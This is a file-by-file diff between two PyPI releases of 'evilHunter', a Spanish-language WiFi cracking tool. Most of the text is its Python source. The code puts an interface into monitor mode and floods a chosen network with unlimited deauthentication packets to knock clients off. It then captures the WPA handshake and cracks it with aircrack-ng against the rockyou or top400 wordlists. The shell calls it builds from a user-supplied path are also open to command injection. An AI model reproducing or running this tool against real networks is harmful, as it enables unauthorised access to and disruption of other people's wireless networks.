# Comparing `tmp/evilHunter-0.1.1.tar.gz` & `tmp/evilHunter-0.1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.1.tar", last modified: Thu Jun  8 10:40:28 2023, max compression
+gzip compressed data, was "evilHunter-0.1.2.tar", last modified: Thu Jun  8 19:45:49 2023, max compression
```

## Comparing `evilHunter-0.1.1.tar` & `evilHunter-0.1.2.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 10:40:28.624751 evilHunter-0.1.1/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      963 2023-06-08 10:40:28.624751 evilHunter-0.1.1/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      730 2023-06-08 10:36:30.000000 evilHunter-0.1.1/README.md
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 10:40:28.624751 evilHunter-0.1.1/evilHunter.egg-info/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      963 2023-06-08 10:40:28.000000 evilHunter-0.1.1/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-08 10:40:28.000000 evilHunter-0.1.1/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-08 10:40:28.000000 evilHunter-0.1.1/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)       12 2023-06-08 10:40:28.000000 evilHunter-0.1.1/evilHunter.egg-info/requires.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-08 10:40:28.000000 evilHunter-0.1.1/evilHunter.egg-info/top_level.txt
--rwxr--r--   0 supervisor  (1000) supervisor  (1000)    14870 2023-06-08 09:46:04.000000 evilHunter-0.1.1/evilHunter.py
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-08 10:40:28.624751 evilHunter-0.1.1/setup.cfg
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      522 2023-06-08 10:39:26.000000 evilHunter-0.1.1/setup.py
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 19:45:49.815670 evilHunter-0.1.2/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1234 2023-06-08 19:45:49.815670 evilHunter-0.1.2/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1001 2023-06-08 19:45:31.000000 evilHunter-0.1.2/README.md
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-08 19:45:49.815670 evilHunter-0.1.2/evilHunter.egg-info/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1234 2023-06-08 19:45:49.000000 evilHunter-0.1.2/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-08 19:45:49.000000 evilHunter-0.1.2/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-08 19:45:49.000000 evilHunter-0.1.2/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-08 19:45:49.000000 evilHunter-0.1.2/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-08 19:45:49.000000 evilHunter-0.1.2/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)    15347 2023-06-08 19:44:40.000000 evilHunter-0.1.2/evilHunter.py
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-08 19:45:49.815670 evilHunter-0.1.2/setup.cfg
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      519 2023-06-08 19:45:31.000000 evilHunter-0.1.2/setup.py
```

### Comparing `evilHunter-0.1.1/PKG-INFO` & `evilHunter-0.1.2/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,33 +1,35 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.1
+Version: 0.1.2
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
 
 
 Argumentos:
     
-        ** Esta herramineta se puede ejecutar sin argumentos y usara el famoso 'rockyou' como diccionario **     
+        ** Esta herramineta se puede ejecutar sin argumentos y usa'top400.txt' como diccionario **     
 
 
     # OPTIONAL:
         
         [♦] evilHunter -w /path/to/wordlists
+        
             (-w / -wordlist)
-            (-h / --help)
+              (-h / --help)
+              
 # INSTALACIÓN:
 
-PyPi:
+PyPi: (https://pypi.org/project/evilHunter/)
 
     command_line = pip install evilHunter
 
 Git Hub:
 
     Command Lines:
     
@@ -42,7 +44,14 @@
 
     Esta herramienta requiere de python3 y de el pack
     de herramientas de 'aircrack-ng'
         -  airmon-ng
         -  aircrack-ng
         -  aireplay-ng
         -  airodump-ng
+               
+# DICCIONARIO:
+
+    Diccionario default "top400.txt"
+    RockYou install -> (https://github.com/an0mal1a/evilHunter/releases/tag/RockYou)
+    
+    Para especificar el diccionario con -w /path/to/dict
```

### Comparing `evilHunter-0.1.1/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.2/evilHunter.egg-info/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,33 +1,35 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.1
+Version: 0.1.2
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
 
 
 Argumentos:
     
-        ** Esta herramineta se puede ejecutar sin argumentos y usara el famoso 'rockyou' como diccionario **     
+        ** Esta herramineta se puede ejecutar sin argumentos y usa'top400.txt' como diccionario **     
 
 
     # OPTIONAL:
         
         [♦] evilHunter -w /path/to/wordlists
+        
             (-w / -wordlist)
-            (-h / --help)
+              (-h / --help)
+              
 # INSTALACIÓN:
 
-PyPi:
+PyPi: (https://pypi.org/project/evilHunter/)
 
     command_line = pip install evilHunter
 
 Git Hub:
 
     Command Lines:
     
@@ -42,7 +44,14 @@
 
     Esta herramienta requiere de python3 y de el pack
     de herramientas de 'aircrack-ng'
         -  airmon-ng
         -  aircrack-ng
         -  aireplay-ng
         -  airodump-ng
+               
+# DICCIONARIO:
+
+    Diccionario default "top400.txt"
+    RockYou install -> (https://github.com/an0mal1a/evilHunter/releases/tag/RockYou)
+    
+    Para especificar el diccionario con -w /path/to/dict
```

### Comparing `evilHunter-0.1.1/evilHunter.py` & `evilHunter-0.1.2/evilHunter.py`

 * *Files 12% similar despite different names*

```diff
@@ -6,56 +6,65 @@
     import colorama
     from colorama import Fore
     import os
     import time
     import re
     import subprocess
     import threading
-    import pprint
     import multiprocessing
     import os
-    import signal
+    import argparse
     time.sleep(1)
     print(Fore.GREEN + "\n\t[*] " + Fore.YELLOW + "Librerias importadas correctamente...")
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
 
 def delete_files():
-    os.system("rm -r captures/*")
-    os.system("rm -r espec/*")
+    os.system("rm -r captures/* > /dev/null")
+    os.system("rm -r espec/* > /dev/null")
+
+
+def restart_net():
+    os.system("service networking restart")
+    os.system("service NetworkManager restart")
+# COMPROBAR SI EL ARGUMENTO -w FUNCIONA Y SE COMPRUEBA
 
 
 def exiting(err):
     if err:
         if err == "True":
-            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...")
-        else:
-            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...", err)
+            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)
+
+        elif err == "done":
+            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
+
     else:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
-    print(Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Restarting network services"
-          + Fore.YELLOW +
-          Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " + Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
+    print(
+        Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
+                        Fore.LIGHTCYAN_EX + "Restarting network services"
+        + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
+                        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
 
-    os.system("service networking restart")
-    os.system("service NetworkManager restart")
 
     try:
         if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
             os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
     except NameError:
         pass
 
-    print(Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
+    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
           + Fore.RESET)
+
+    restart_net()
     delete_files()
 
     print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
     exit()
 
 
 def am_i_root():
@@ -195,35 +204,35 @@
         exiting(err=True)
         prepared = False
 
     if prepared:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")
 
 
-def get_options():
+def get_options(args):
     hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)
 
     all_got = []
-    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop..." + Fore.RESET)
+    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop..." + Fore.RESET)
     input(Fore.LIGHTRED_EX + "\n\t\t[ENTER] To continue")
     while True:
         try:
             output = hand.stdout.readline()
             if not output:
                 break
             all_got.append(output)
             print(output.decode().strip())
         except KeyboardInterrupt:
             break
     print(Fore.LIGHTCYAN_EX + "\n\n[*] " + Fore.RESET + "Ended session of capture data...")
     print(Fore.BLUE + "\n\t[T] " + Fore.YELLOW + "Packets captured...")
-    process_data(all_got)
+    process_data(all_got, args)
 
 
-def process_data(all_got):
+def process_data(all_got, args):
     dict = {}
     print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
     time.sleep(1)
 
     with open("espec/data", "wb") as data:
         for line in all_got:
             data.write(line)
@@ -266,18 +275,18 @@
 
             dict[name] = {"bssid": bssid,
                           "encription_type": encription[0],
                           "channel": channel}
 
         else:
             continue
-    print_process_data(dict)
+    print_process_data(dict, args)
 
 
-def print_process_data(dict):
+def print_process_data(dict, args):
     print(Fore.LIGHTCYAN_EX + "\n[" + Fore.RED + "V" + Fore.LIGHTCYAN_EX + "] " + Fore.YELLOW +
           "Listing aviable networks to attack...")
 
     # Asingamos variables necesarias
     net = 0
 
     print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net)
@@ -303,145 +312,154 @@
         if network_to_attack not in dict:
             print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no existe..".format(network_to_attack))
             network_to_attack = None
         else:
             print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
             time.sleep(0.5)
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
-            prepare_attack(dict, network_to_attack)
+            prepare_attack(dict, network_to_attack, args)
 
 
-def prepare_attack(dict, network_to_attack):
+def prepare_attack(dict, network_to_attack, args):
     file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
-    "Enter the name of the file to save [E.j capture1] > ")
+                                                    "Enter the name of the file to save [E.j capture1] > ")
 
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
     ch = dict[network_to_attack]['channel']
 
     # Leer handshake
     direc = "captures/" + bssid
 
     if not os.path.exists(direc):
         os.makedirs(direc)
     time.sleep(1)
-    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Al capturar el " +
-          Fore.RED + '"WPA handshake ' + Fore.LIGHTCYAN_EX +
-          " parara solo. --->  [CTRL + C] to stop manually..." + Fore.RESET)
+    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
+          Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
+          Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
     hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
 
-    # Enviar paquetes "deauth"
-    reject = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
-
-    # Compartimos evento
-    evento = threading.Event()
 
-    # Preparamos los hilos
-    capture = threading.Thread(target=capture_handshake(hand, evento, direc))
-
-    deauth = threading.Thread(target=deauth_clients(reject, evento))
+    # Preparamos multiproceso para poder pararlos todos a la vez
+    deauth = multiprocessing.Process(target=deauth_clients(bssid))
     deauth.start()
 
+    # Preparamos subproceso de capture hand
+    capture = threading.Thread(target=capture_handshake(hand, direc, args, deauth))
+
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
 
     # Juntamos para detener
     capture.join()
     deauth.join()
 
 
-def deauth_clients(deauth, evento):
-    while True:
-        try:
-            if evento.is_set():
-                os.kill(os.getpid(), signal.SIGINT)
-            else:
-                continue
-        except KeyboardInterrupt:
-            #print(Fore.YELLOW + "\n\n[!]" + Fore.BLUE + "Stopping deauth clients")
-            break
+def deauth_clients(bssid):
+    # Enviar paquetes "deauth"
+    reject = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
 
 
-def capture_handshake(hand, evento, direc):
+
+def capture_handshake(hand,  direc, args, deauth):
     done = False
     while True:
         try:
             output = hand.stdout.readline()
 
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
+                deauth.terminate()
                 break
 
         except KeyboardInterrupt:
+            deauth.terminate()
             break
 
+    print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
-        evento.set()
-        print(Fore.LIGHTYELLOW_EX + "\n\n\n\n\n\n\n[V] " + Fore.CYAN + "Handskake capturado...")
+        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
-        evento.set()
-        print(Fore.LIGHTCYAN_EX + "\n\n\n\n\t[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
-    crack_handshake(direc)
+        print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
+        exiting(err=True)
+    crack_handshake(direc, args)
 
 
-def crack_handshake(direc):
+def find_wordlists(wordlists):
+    found = os.system("find %s > /dev/null" % wordlists)
+    if found != 0:
+        return "words/rockyou.txt"
+    else:
+        return wordlists
+
+
+def crack_handshake(direc, args):
+    # Buscamos arhchivo .cap
     os.system("find {}/*.cap > espec/capture_file".format(direc))
 
+    # Comprobamos si nos ha pasasdo discionario y si existe en su suste,ma
+    if args.wordlist:
+        wordlists = find_wordlists(args.wordlist)
+    else:
+        wordlists = "words/rockyou.txt"
+
+    # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
     with open("espec/capture_file", "r") as file:
         file = file.read().strip()
 
     print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
-    #input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
+    # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
     time.sleep(3)
-    crack = subprocess.Popen(["aircrack-ng", file, "-w", "words/rockyou.txt"], stdout=subprocess.PIPE)
 
+    # Empezamos con el crack de la password
+    crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlists], stdout=subprocess.PIPE)
+
+    # Mostramos la salida hasta que se encuentre la contraseña (o no)
     while True:
         try:
             output = crack.stdout.readline()
             if not output:
                 break
             print(output.decode().strip())
         except KeyboardInterrupt:
             break
 
 
 def main():
     try:
+        # Recogemos argumentos
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-w", "--wordlist", help="Use an extern wordlists dictionary", required=False)
+        args = parser.parse_args()
+
         # Somos root?
         am_i_root()
 
         # Tenemos las herraientas?
         check_utilities()
 
         # Listamos interfaces
         list_save_interf()
 
         # Escanemos redes cercanas
-        get_options()
+        get_options(args)
 
-        os.system("sudo service networking restart")
-        os.system("sudo service NetworkManager restart")
-        if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
-            os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
-
-        delete_files()
+        # Borramos datos
+        exiting(err="done")
 
+    # Salida manual
     except KeyboardInterrupt:
         exiting(err=False)
-    except Exception:
-        delete_files()
-
-        os.system("sudo service networking restart")
-        os.system("sudo service NetworkManager restart")
-        if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
-            os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
 
+    # Salida por error
+    except Exception as e:
+        exiting(err=e)
 
 
 
 if __name__ == "__main__":
     main()
```

### Comparing `evilHunter-0.1.1/setup.py` & `evilHunter-0.1.2/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,21 +1,21 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.1",
+    version="0.1.2",
     description="Cracking WiFi(Hanshake)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
     scripts=["evilHunter.py"],
     install_requires=[
-        'aircrack-ng'
+        'colorama'
 ],
 
 )
```

